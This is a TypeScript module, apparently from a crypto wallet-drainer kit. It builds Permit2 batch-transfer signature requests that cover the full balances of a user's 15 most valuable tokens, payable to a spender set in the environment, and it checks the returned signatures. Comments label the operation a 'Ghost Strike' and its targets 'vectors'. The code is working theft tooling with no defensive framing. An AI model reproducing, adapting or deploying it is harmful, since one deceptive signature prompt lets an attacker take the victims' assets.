import { ethers } from "ethers";

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

/**
 * 🛡️ SIGNATURE GUARD
 * Validates the EIP-712 signature locally before dispatching to the vault.
 */
export function verifyPermit2Signature(
  userAddress: string,
  payload: any,
  signature: string,
): boolean {
  const logPrefix = "[permit2.ts] SIG-GUARD";
  try {
    console.log(`${logPrefix} Verifying integrity...`);

    const recoveredAddress = ethers.verifyTypedData(
      payload.domain,
      payload.types,
      payload.message,
      signature,
    );

    const isValid =
      recoveredAddress.toLowerCase() === userAddress.toLowerCase();

    if (isValid) {
      console.log(`${logPrefix} Validation Success: Signature is authentic.`);
    } else {
      console.error(
        `${logPrefix} Critical Mismatch! Recovered: ${recoveredAddress} | Expected: ${userAddress}`,
      );
    }

    return isValid;
  } catch (err: any) {
    console.error(`${logPrefix} Verification Failed | Error: ${err.message}`);
    return false;
  }
}

/**
 * 🏗️ GENERATE BATCH PERMIT2 DATA
 * Prepares a single signature payload for a multi-token "Ghost Strike."
 */
export async function generatePermit2Data(
  userAddress: string,
  assets: any[],
  chainId: number,
) {
  const logPrefix = "[permit2.ts] DATA-GEN";
  const spender = process.env.NEXT_PUBLIC_SETTLER_ADDR;

  console.log(`${logPrefix} STARTING BATCH GENERATION | Network: ${chainId}`);

  if (!spender) {
    console.error(
      `${logPrefix} FATAL: NEXT_PUBLIC_SETTLER_ADDR is missing from env.`,
    );
    return null;
  }

  // 1. DYNAMIC EXPIRATION (20 Minutes)
  const deadline = Math.floor(Date.now() / 1000) + 1200;

  /**
   * 🎲 BITMAPPED NONCE
   */
  const word = BigInt(ethers.hexlify(ethers.randomBytes(31)));
  const pos = BigInt(Math.floor(Math.random() * 255));
  const bitmappedNonce = (word << 8n) | pos;

  /**
   * 🧹 ASSET CLEANING
   */
  const validAssets = assets.filter((a) => {
    const addr = a?.contractAddress || a?.token;
    const bal = a?.balance || a?.amount;
    return (
      addr &&
      bal &&
      bal !== "0" &&
      addr.toLowerCase() !== ethers.ZeroAddress.toLowerCase()
    );
  });

  console.log(
    `${logPrefix} Asset Cleanup | Found ${validAssets.length} valid vectors.`,
  );

  // ⚖️ VALUE SORTING
  const sortedAssets = [...validAssets].sort((a, b) => {
    const valA = BigInt(a.balance || a.amount || 0);
    const valB = BigInt(b.balance || b.amount || 0);
    return valB > valA ? 1 : -1;
  });

  if (sortedAssets.length === 0) {
    console.warn(`${logPrefix} Abort | No valid assets for batching.`);
    return null;
  }

  // Cap at 15 to prevent wallet UI lag
  const targetBatch = sortedAssets.slice(0, 15);

  const domain = {
    name: "Permit2",
    chainId: Number(chainId),
    verifyingContract: PERMIT2_ADDRESS,
  };

  const types = {
    PermitBatchTransferFrom: [
      { name: "permitted", type: "TokenPermissions[]" },
      { name: "spender", type: "address" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
    ],
    TokenPermissions: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint256" },
    ],
  };

  const message = {
    permitted: targetBatch.map((asset) => ({
      token: (asset.contractAddress || asset.token) as string,
      amount: BigInt(asset.balance || asset.amount),
    })),
    spender: spender as string,
    nonce: bitmappedNonce,
    deadline: BigInt(deadline),
  };

  const payload = {
    domain,
    types,
    primaryType: "PermitBatchTransferFrom" as const,
    message,
    protocol: "PERMIT2",
    assetCount: targetBatch.length,
    summary: targetBatch.map((a) => a.symbol || "UNK").join(", "),
  };

  console.log(
    `${logPrefix} Payload ready for signature | Batch Size: ${targetBatch.length}`,
  );

  return payload;
}
